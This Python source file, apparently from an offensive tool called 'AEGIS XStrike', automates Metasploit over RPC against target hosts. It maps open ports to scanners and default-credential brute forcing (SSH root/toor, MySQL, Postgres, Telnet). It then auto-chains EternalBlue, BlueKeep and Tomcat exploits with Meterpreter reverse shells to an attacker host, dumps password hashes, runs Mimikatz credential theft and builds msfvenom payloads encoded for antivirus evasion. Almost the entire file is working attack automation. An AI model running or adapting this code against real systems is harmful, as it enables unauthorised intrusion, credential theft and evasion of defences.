"""
Metasploit Framework Integration Engine
========================================
Bridges AEGIS XStrike to Metasploit Framework via the MSFRPC API.
Provides access to ALL Metasploit payloads, exploits, auxiliary modules,
post-exploitation, and encoders.

Usage:
    from metasploit_engine import MetasploitEngine
    msf = MetasploitEngine(host="192.168.195.137", password="xstrike")
    result = msf.run_exploit("exploit/windows/smb/ms17_010_eternalblue", "192.168.195.155")
"""

import json
import time
import socket
import os
import ssl
import urllib.request
import urllib.error
from datetime import datetime
from typing import Optional, Callable


# ══════════════════════════════════════════════════════════════════════
# MSFRPC CLIENT
# ══════════════════════════════════════════════════════════════════════

class MsfRpcError(Exception):
    """Metasploit RPC communication error."""
    pass


class MetasploitEngine:
    """
    Full Metasploit Framework integration via MSFRPC.

    Supports:
    - exploit/* modules (EternalBlue, BlueKeep, etc.)
    - auxiliary/scanner/* modules (port scan, SMB enum, FTP anon, etc.)
    - post/* modules (hashdump, mimikatz, etc.)
    - payload/* selection (meterpreter, shell, etc.)
    - encoder/* for AV evasion
    - Session management (interact, route, pivot)

    Start msfrpcd on Kali:
        msfrpcd -P xstrike -S -a 0.0.0.0 -p 55553
    """

    def __init__(self, host: str = "127.0.0.1", port: int = 55553,
                 password: str = "xstrike", ssl_enabled: bool = True,
                 log_fn: Callable = None):
        self.host = host
        self.port = port
        self.password = password
        self.ssl_enabled = ssl_enabled
        self.token = None
        self.log = log_fn or print
        self._connected = False
        self._msgpack_available = False

        try:
            import msgpack
            self._msgpack_available = True
        except ImportError:
            pass

    # ── CONNECTION ────────────────────────────────────────────────────

    def connect(self) -> bool:
        """Authenticate to msfrpcd and obtain a session token."""
        try:
            result = self._rpc_call("auth.login", [self.password])
            if result and result.get("result") == "success":
                self.token = result.get("token")
                self._connected = True
                self.log(f"    ✅ Connected to Metasploit RPC at {self.host}:{self.port}")
                return True
            else:
                self.log(f"    ⚠ MSF auth failed: {result}")
                return False
        except Exception as e:
            self.log(f"    ⚠ Cannot reach Metasploit RPC ({self.host}:{self.port}): {e}")
            return False

    def is_connected(self) -> bool:
        return self._connected and self.token is not None

    def disconnect(self):
        """Logout from msfrpcd."""
        if self.token:
            try:
                self._rpc_call("auth.logout", [self.token])
            except Exception:
                pass
        self._connected = False
        self.token = None

    # ── LOW-LEVEL RPC ─────────────────────────────────────────────────

    def _rpc_call(self, method: str, params: list = None) -> dict:
        """Make an MSFRPC JSON call."""
        params = params or []
        payload = json.dumps({"jsonrpc": "2.0", "method": method, "id": 1, "params": params})
        url = f"{'https' if self.ssl_enabled else 'http'}://{self.host}:{self.port}/api/"

        req = urllib.request.Request(
            url,
            data=payload.encode("utf-8"),
            headers={
                "Content-Type": "application/json",
                "Authorization": f"Bearer {self.token}" if self.token else "",
            },
        )

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        try:
            resp = urllib.request.urlopen(req, timeout=30, context=ctx)
            return json.loads(resp.read().decode("utf-8"))
        except urllib.error.URLError as e:
            raise MsfRpcError(f"RPC error: {e}")

    def _rpc_authenticated(self, method: str, params: list = None) -> dict:
        """Make an authenticated RPC call."""
        if not self.token:
            raise MsfRpcError("Not authenticated")
        all_params = [self.token] + (params or [])
        return self._rpc_call(method, all_params)

    # ── CONSOLE-BASED EXECUTION ───────────────────────────────────────
    # For maximum flexibility, we use MSF console commands.
    # This gives access to EVERYTHING: exploits, payloads, encoders, post modules.

    def create_console(self) -> str:
        """Create a new MSF console and return its ID."""
        result = self._rpc_authenticated("console.create")
        return result.get("id", "0")

    def destroy_console(self, console_id: str):
        """Destroy an MSF console."""
        try:
            self._rpc_authenticated("console.destroy", [console_id])
        except Exception:
            pass

    def console_write(self, console_id: str, command: str):
        """Write a command to the console."""
        self._rpc_authenticated("console.write", [console_id, command + "\n"])

    def console_read(self, console_id: str, timeout: int = 30) -> str:
        """Read console output, waiting for the prompt to return."""
        output = ""
        start = time.time()
        while time.time() - start < timeout:
            result = self._rpc_authenticated("console.read", [console_id])
            data = result.get("data", "")
            output += data
            if result.get("busy") is False or result.get("prompt"):
                if data:
                    continue  # Keep reading while there's data
                break
            time.sleep(1)
        return output

    def run_console_commands(self, commands: list, timeout_per_cmd: int = 60) -> str:
        """Run a sequence of console commands and capture ALL output."""
        console_id = self.create_console()
        full_output = ""
        try:
            # Wait for initial prompt
            time.sleep(2)
            self.console_read(console_id, timeout=5)

            for cmd in commands:
                self.console_write(console_id, cmd)
                time.sleep(1)
                output = self.console_read(console_id, timeout=timeout_per_cmd)
                full_output += f"\nmsf> {cmd}\n{output}"
        finally:
            self.destroy_console(console_id)
        return full_output

    # ══════════════════════════════════════════════════════════════════
    # HIGH-LEVEL EXPLOIT API
    # ══════════════════════════════════════════════════════════════════

    def run_exploit(self, module_path: str, rhost: str, rport: int = None,
                    payload: str = None, lhost: str = None, lport: int = 4444,
                    extra_options: dict = None, timeout: int = 120) -> dict:
        """
        Run any Metasploit exploit module and capture evidence.

        Returns:
            {
                "success": bool,
                "module": str,
                "target": str,
                "output": str,        # Full console output (THE EVIDENCE)
                "session_id": str,     # If shell obtained
                "timestamp": str,
                "duration": float,
                "payload": str,
                "options": dict,
            }
        """
        ts_start = datetime.now()
        options = extra_options or {}

        commands = [
            f"use {module_path}",
            f"set RHOSTS {rhost}",
        ]
        if rport:
            commands.append(f"set RPORT {rport}")
        if payload:
            commands.append(f"set PAYLOAD {payload}")
        if lhost:
            commands.append(f"set LHOST {lhost}")
            commands.append(f"set LPORT {lport}")
        for k, v in options.items():
            commands.append(f"set {k} {v}")
        commands.append("show options")
        commands.append("run -j")  # Run as job

        self.log(f"    🔴 MSF: {module_path} → {rhost}" + (f":{rport}" if rport else ""))
        output = self.run_console_commands(commands, timeout_per_cmd=timeout)

        # Check for session creation
        session_id = None
        success = False
        if "session" in output.lower() and ("opened" in output.lower() or "meterpreter" in output.lower()):
            success = True
            # Extract session ID
            for line in output.split("\n"):
                if "session" in line.lower() and "opened" in line.lower():
                    parts = line.split()
                    for p in parts:
                        if p.isdigit():
                            session_id = p
                            break
        elif "auxiliary" in module_path and ("+" in output or "found" in output.lower() or "detected" in output.lower()):
            success = True
        elif "vulnerable" in output.lower() or "exploited" in output.lower():
            success = True

        ts_end = datetime.now()

        return {
            "success": success,
            "module": module_path,
            "target": f"{rhost}:{rport}" if rport else rhost,
            "output": output,
            "session_id": session_id,
            "timestamp_start": ts_start.isoformat(),
            "timestamp_end": ts_end.isoformat(),
            "duration": (ts_end - ts_start).total_seconds(),
            "payload": payload or "default",
            "options": {**{"RHOSTS": rhost}, **({"RPORT": rport} if rport else {}), **options},
        }

    def run_auxiliary(self, module_path: str, rhost: str, rport: int = None,
                      extra_options: dict = None, timeout: int = 60) -> dict:
        """Run an auxiliary/scanner module."""
        return self.run_exploit(module_path, rhost, rport, extra_options=extra_options, timeout=timeout)

    def run_post(self, module_path: str, session_id: str,
                 extra_options: dict = None, timeout: int = 60) -> dict:
        """Run a post-exploitation module on an active session."""
        ts_start = datetime.now()
        options = extra_options or {}

        commands = [
            f"use {module_path}",
            f"set SESSION {session_id}",
        ]
        for k, v in options.items():
            commands.append(f"set {k} {v}")
        commands.append("run")

        self.log(f"    🟣 MSF POST: {module_path} → session {session_id}")
        output = self.run_console_commands(commands, timeout_per_cmd=timeout)
        ts_end = datetime.now()

        return {
            "success": "+" in output or "success" in output.lower(),
            "module": module_path,
            "session_id": session_id,
            "output": output,
            "timestamp_start": ts_start.isoformat(),
            "timestamp_end": ts_end.isoformat(),
            "duration": (ts_end - ts_start).total_seconds(),
        }

    # ══════════════════════════════════════════════════════════════════
    # SESSION MANAGEMENT
    # ══════════════════════════════════════════════════════════════════

    def list_sessions(self) -> dict:
        """List all active sessions."""
        try:
            return self._rpc_authenticated("session.list")
        except Exception:
            return {}

    def session_shell_read(self, session_id: str) -> str:
        """Read output from a shell session."""
        try:
            result = self._rpc_authenticated("session.shell_read", [session_id])
            return result.get("data", "")
        except Exception:
            return ""

    def session_shell_write(self, session_id: str, command: str) -> bool:
        """Write a command to a shell session."""
        try:
            self._rpc_authenticated("session.shell_write", [session_id, command + "\n"])
            return True
        except Exception:
            return False

    def session_meterpreter_run(self, session_id: str, command: str, timeout: int = 30) -> str:
        """Run a Meterpreter command and capture output."""
        try:
            self._rpc_authenticated("session.meterpreter_write", [session_id, command])
            time.sleep(2)
            result = self._rpc_authenticated("session.meterpreter_read", [session_id])
            return result.get("data", "")
        except Exception as e:
            return f"Error: {e}"

    # ══════════════════════════════════════════════════════════════════
    # PRE-BUILT ATTACK MODULES
    # Each returns standardized evidence dict
    # ══════════════════════════════════════════════════════════════════

    def check_eternalblue(self, ip: str) -> dict:
        """Check if target is vulnerable to MS17-010 (EternalBlue) WITHOUT exploiting."""
        return self.run_auxiliary(
            "auxiliary/scanner/smb/smb_ms17_010",
            ip, 445, timeout=60
        )

    def exploit_eternalblue(self, ip: str, lhost: str, lport: int = 4444) -> dict:
        """Exploit EternalBlue with Meterpreter payload."""
        return self.run_exploit(
            "exploit/windows/smb/ms17_010_eternalblue",
            ip, 445,
            payload="windows/x64/meterpreter/reverse_tcp",
            lhost=lhost, lport=lport,
            timeout=120
        )

    def check_bluekeep(self, ip: str) -> dict:
        """Check if target is vulnerable to CVE-2019-0708 (BlueKeep)."""
        return self.run_auxiliary(
            "auxiliary/scanner/rdp/cve_2019_0708_bluekeep",
            ip, 3389, timeout=60
        )

    def exploit_bluekeep(self, ip: str, lhost: str, lport: int = 4445) -> dict:
        """Exploit BlueKeep with Meterpreter."""
        return self.run_exploit(
            "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
            ip, 3389,
            payload="windows/x64/meterpreter/reverse_tcp",
            lhost=lhost, lport=lport,
            extra_options={"TARGET": "1"},
            timeout=120
        )

    def scan_smb_shares(self, ip: str) -> dict:
        """Enumerate SMB shares."""
        return self.run_auxiliary(
            "auxiliary/scanner/smb/smb_enumshares",
            ip, 445, timeout=30
        )

    def scan_smb_version(self, ip: str) -> dict:
        """Detect SMB version (v1 vs v2/v3)."""
        return self.run_auxiliary(
            "auxiliary/scanner/smb/smb_version",
            ip, 445, timeout=30
        )

    def scan_ftp_anonymous(self, ip: str) -> dict:
        """Check for anonymous FTP access."""
        return self.run_auxiliary(
            "auxiliary/scanner/ftp/anonymous",
            ip, 21, timeout=30
        )

    def scan_ftp_version(self, ip: str) -> dict:
        """Detect FTP service version."""
        return self.run_auxiliary(
            "auxiliary/scanner/ftp/ftp_version",
            ip, 21, timeout=20
        )

    def brute_ssh(self, ip: str, userpass_file: str = None) -> dict:
        """SSH brute force with default credentials."""
        opts = {"STOP_ON_SUCCESS": "true", "VERBOSE": "true"}
        if userpass_file:
            opts["USERPASS_FILE"] = userpass_file
        else:
            opts["USERNAME"] = "root"
            opts["PASSWORD"] = "toor"
        return self.run_auxiliary(
            "auxiliary/scanner/ssh/ssh_login",
            ip, 22, extra_options=opts, timeout=60
        )

    def scan_mysql_login(self, ip: str) -> dict:
        """Test MySQL default credentials."""
        return self.run_auxiliary(
            "auxiliary/scanner/mysql/mysql_login",
            ip, 3306,
            extra_options={"USERNAME": "root", "PASSWORD": "", "STOP_ON_SUCCESS": "true"},
            timeout=30
        )

    def scan_postgres_login(self, ip: str) -> dict:
        """Test PostgreSQL default credentials."""
        return self.run_auxiliary(
            "auxiliary/scanner/postgres/postgres_login",
            ip, 5432,
            extra_options={"USERNAME": "postgres", "PASSWORD": "postgres"},
            timeout=30
        )

    def scan_http_version(self, ip: str, port: int = 80) -> dict:
        """Detect HTTP server version."""
        return self.run_auxiliary(
            "auxiliary/scanner/http/http_version",
            ip, port, timeout=20
        )

    def scan_http_title(self, ip: str, port: int = 80) -> dict:
        """Grab HTTP page title."""
        return self.run_auxiliary(
            "auxiliary/scanner/http/title",
            ip, port, timeout=20
        )

    def exploit_tomcat_mgr(self, ip: str, lhost: str) -> dict:
        """Exploit Tomcat Manager with default creds."""
        return self.run_exploit(
            "exploit/multi/http/tomcat_mgr_upload",
            ip, 8080,
            payload="java/meterpreter/reverse_tcp",
            lhost=lhost,
            extra_options={"HttpUsername": "tomcat", "HttpPassword": "tomcat"},
            timeout=60
        )

    def exploit_jenkins_script(self, ip: str, lhost: str) -> dict:
        """Exploit Jenkins Script Console."""
        return self.run_exploit(
            "exploit/multi/http/jenkins_script_console",
            ip, 8080,
            payload="java/meterpreter/reverse_tcp",
            lhost=lhost,
            timeout=60
        )

    def scan_vnc_none_auth(self, ip: str) -> dict:
        """Check for VNC with no authentication."""
        return self.run_auxiliary(
            "auxiliary/scanner/vnc/vnc_none_auth",
            ip, 5900, timeout=20
        )

    def scan_telnet_login(self, ip: str) -> dict:
        """Test Telnet default credentials."""
        return self.run_auxiliary(
            "auxiliary/scanner/telnet/telnet_login",
            ip, 23,
            extra_options={"USERNAME": "admin", "PASSWORD": "admin"},
            timeout=30
        )

    def scan_rdp_login(self, ip: str) -> dict:
        """Test RDP with known creds."""
        return self.run_auxiliary(
            "auxiliary/scanner/rdp/rdp_scanner",
            ip, 3389, timeout=30
        )

    # ── POST-EXPLOITATION ─────────────────────────────────────────────

    def hashdump(self, session_id: str) -> dict:
        """Dump password hashes from a compromised Windows host."""
        return self.run_post("post/windows/gather/hashdump", session_id, timeout=30)

    def mimikatz(self, session_id: str) -> dict:
        """Run Mimikatz (kiwi) on a Meterpreter session."""
        ts = datetime.now()
        commands = [
            f"sessions -i {session_id}",
            "load kiwi",
            "creds_all",
            "background",
        ]
        output = self.run_console_commands(commands, timeout_per_cmd=30)
        return {
            "success": "creds" in output.lower() or "password" in output.lower(),
            "module": "post/windows/gather/mimikatz",
            "session_id": session_id,
            "output": output,
            "timestamp_start": ts.isoformat(),
        }

    def shell_command(self, session_id: str, command: str) -> str:
        """Run an arbitrary shell command on a session."""
        self.session_shell_write(session_id, command)
        time.sleep(3)
        return self.session_shell_read(session_id)

    # ── PAYLOAD GENERATION ────────────────────────────────────────────

    def generate_payload(self, payload_type: str, lhost: str, lport: int = 4444,
                         fmt: str = "exe", encoder: str = None,
                         iterations: int = 5) -> dict:
        """
        Generate a Metasploit payload with optional encoding for AV evasion.

        payload_type: e.g. "windows/x64/meterpreter/reverse_tcp"
        fmt: exe, elf, raw, python, powershell, etc.
        encoder: e.g. "x86/shikata_ga_nai"
        """
        commands = [
            f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f {fmt}"
        ]
        if encoder:
            commands[0] += f" -e {encoder} -i {iterations}"

        self.log(f"    🔧 Generating payload: {payload_type} ({fmt})")
        output = self.run_console_commands(commands, timeout_per_cmd=30)
        return {
            "payload": payload_type,
            "format": fmt,
            "encoder": encoder,
            "output": output[:500],
        }

    # ══════════════════════════════════════════════════════════════════
    # AUTO-EXPLOIT: Service → Module mapping
    # ══════════════════════════════════════════════════════════════════

    # Map discovered ports/services to Metasploit modules
    SERVICE_MODULE_MAP = {
        21:   [
            {"module": "auxiliary/scanner/ftp/anonymous",   "type": "scanner", "name": "FTP Anonymous Login"},
            {"module": "auxiliary/scanner/ftp/ftp_version",  "type": "scanner", "name": "FTP Version Detection"},
        ],
        22:   [
            {"module": "auxiliary/scanner/ssh/ssh_login",    "type": "scanner", "name": "SSH Brute Force",
             "options": {"USERNAME": "root", "PASSWORD": "toor", "STOP_ON_SUCCESS": "true"}},
            {"module": "auxiliary/scanner/ssh/ssh_version",  "type": "scanner", "name": "SSH Version Detection"},
        ],
        23:   [
            {"module": "auxiliary/scanner/telnet/telnet_login", "type": "scanner", "name": "Telnet Default Creds",
             "options": {"USERNAME": "admin", "PASSWORD": "admin"}},
        ],
        25:   [
            {"module": "auxiliary/scanner/smtp/smtp_enum",   "type": "scanner", "name": "SMTP User Enum"},
        ],
        80:   [
            {"module": "auxiliary/scanner/http/http_version", "type": "scanner", "name": "HTTP Server Version"},
            {"module": "auxiliary/scanner/http/title",        "type": "scanner", "name": "HTTP Page Title"},
        ],
        443:  [
            {"module": "auxiliary/scanner/http/http_version", "type": "scanner", "name": "HTTPS Server Version"},
            {"module": "auxiliary/scanner/http/ssl_version",  "type": "scanner", "name": "SSL/TLS Version Check"},
        ],
        445:  [
            {"module": "auxiliary/scanner/smb/smb_version",     "type": "scanner", "name": "SMB Version Detection"},
            {"module": "auxiliary/scanner/smb/smb_ms17_010",    "type": "scanner", "name": "MS17-010 EternalBlue Check"},
            {"module": "auxiliary/scanner/smb/smb_enumshares",  "type": "scanner", "name": "SMB Share Enumeration"},
        ],
        3306: [
            {"module": "auxiliary/scanner/mysql/mysql_login",   "type": "scanner", "name": "MySQL Default Creds",
             "options": {"USERNAME": "root", "PASSWORD": ""}},
        ],
        3389: [
            {"module": "auxiliary/scanner/rdp/rdp_scanner",     "type": "scanner", "name": "RDP Service Detection"},
            {"module": "auxiliary/scanner/rdp/cve_2019_0708_bluekeep", "type": "scanner", "name": "BlueKeep CVE-2019-0708 Check"},
        ],
        5432: [
            {"module": "auxiliary/scanner/postgres/postgres_login", "type": "scanner", "name": "PostgreSQL Default Creds",
             "options": {"USERNAME": "postgres", "PASSWORD": "postgres"}},
        ],
        5900: [
            {"module": "auxiliary/scanner/vnc/vnc_none_auth", "type": "scanner", "name": "VNC No-Auth Check"},
        ],
        6379: [
            {"module": "auxiliary/scanner/redis/redis_login", "type": "scanner", "name": "Redis Unauthenticated Access"},
        ],
        8080: [
            {"module": "auxiliary/scanner/http/http_version", "type": "scanner", "name": "HTTP 8080 Version"},
            {"module": "auxiliary/scanner/http/tomcat_mgr_default_creds", "type": "scanner", "name": "Tomcat Manager Default Creds"},
        ],
        27017: [
            {"module": "auxiliary/scanner/mongodb/mongodb_login", "type": "scanner", "name": "MongoDB Unauthenticated"},
        ],
    }

    # Exploit modules to try if scanner finds vulnerability
    EXPLOIT_CHAINS = {
        "MS17-010": {
            "check_module": "auxiliary/scanner/smb/smb_ms17_010",
            "exploit_module": "exploit/windows/smb/ms17_010_eternalblue",
            "payload": "windows/x64/meterpreter/reverse_tcp",
            "port": 445,
            "cve": "CVE-2017-0144",
            "cvss": 9.8,
            "mitre_id": "T1210",
        },
        "BlueKeep": {
            "check_module": "auxiliary/scanner/rdp/cve_2019_0708_bluekeep",
            "exploit_module": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
            "payload": "windows/x64/meterpreter/reverse_tcp",
            "port": 3389,
            "cve": "CVE-2019-0708",
            "cvss": 9.8,
            "mitre_id": "T1210",
        },
        "Tomcat-Manager": {
            "check_module": "auxiliary/scanner/http/tomcat_mgr_default_creds",
            "exploit_module": "exploit/multi/http/tomcat_mgr_upload",
            "payload": "java/meterpreter/reverse_tcp",
            "port": 8080,
            "cve": "CVE-2009-3548",
            "cvss": 7.5,
            "mitre_id": "T1190",
        },
    }

    def auto_exploit_host(self, ip: str, ports: list, lhost: str = None,
                          log_fn: Callable = None) -> list:
        """
        Automatically map discovered ports to MSF modules and run them.
        This is the main integration point called by the orchestrator.

        Returns list of evidence dicts for each module run.
        """
        if log_fn:
            self.log = log_fn
        results = []

        self.log(f"\n    🔴 METASPLOIT ENGINE — Targeting {ip} ({len(ports)} ports)")

        # Phase 1: Run all applicable scanner modules
        for port in sorted(ports):
            modules = self.SERVICE_MODULE_MAP.get(port, [])
            for mod_info in modules:
                if not self.is_connected():
                    break
                try:
                    opts = mod_info.get("options", {})
                    result = self.run_auxiliary(
                        mod_info["module"], ip, port,
                        extra_options=opts, timeout=45
                    )
                    result["module_name"] = mod_info["name"]
                    result["port"] = port
                    results.append(result)

                    status = "✅ HIT" if result["success"] else "➖ clean"
                    self.log(f"      {status}: {mod_info['name']} (port {port})")
                except Exception as e:
                    self.log(f"      ⚠ {mod_info['name']}: {e}")

        # Phase 2: Chain exploits for confirmed vulnerabilities
        if lhost:
            for chain_name, chain in self.EXPLOIT_CHAINS.items():
                if chain["port"] not in ports:
                    continue
                # Check if scanner confirmed vulnerability
                scanner_hit = any(
                    r.get("success") and chain["check_module"] in r.get("module", "")
                    for r in results
                )
                if scanner_hit:
                    self.log(f"\n      🔴 EXPLOITING: {chain_name} on {ip}:{chain['port']}")
                    try:
                        exploit_result = self.run_exploit(
                            chain["exploit_module"], ip, chain["port"],
                            payload=chain["payload"],
                            lhost=lhost,
                            timeout=120
                        )
                        exploit_result["chain_name"] = chain_name
                        exploit_result["cve"] = chain["cve"]
                        exploit_result["cvss"] = chain["cvss"]
                        exploit_result["mitre_id"] = chain["mitre_id"]
                        results.append(exploit_result)

                        if exploit_result["success"]:
                            self.log(f"      💀 EXPLOITED: {chain_name} — session {exploit_result.get('session_id', 'N/A')}")

                            # Phase 3: Post-exploitation on successful sessions
                            sid = exploit_result.get("session_id")
                            if sid:
                                self.log(f"      🟣 Running post-exploitation on session {sid}")
                                try:
                                    hash_result = self.hashdump(sid)
                                    if hash_result["success"]:
                                        results.append(hash_result)
                                        self.log(f"      ✅ Hashdump captured")
                                except Exception:
                                    pass
                        else:
                            self.log(f"      ➖ Exploit failed: {chain_name}")
                    except Exception as e:
                        self.log(f"      ⚠ Exploit error: {e}")

        self.log(f"\n    📊 Metasploit: {sum(1 for r in results if r.get('success'))} hits / {len(results)} modules")
        return results


# ══════════════════════════════════════════════════════════════════════
# STANDALONE TEST
# ══════════════════════════════════════════════════════════════════════

def test_connection(host: str = "192.168.195.137", password: str = "xstrike"):
    """Quick connectivity test."""
    msf = MetasploitEngine(host=host, password=password)
    if msf.connect():
        print(f"✅ Connected to MSF at {host}")
        sessions = msf.list_sessions()
        print(f"   Active sessions: {len(sessions)}")
        msf.disconnect()
    else:
        print(f"❌ Cannot reach MSF at {host}")


if __name__ == "__main__":
    import sys
    host = sys.argv[1] if len(sys.argv) > 1 else "192.168.195.137"
    pwd = sys.argv[2] if len(sys.argv) > 2 else "xstrike"
    test_connection(host, pwd)
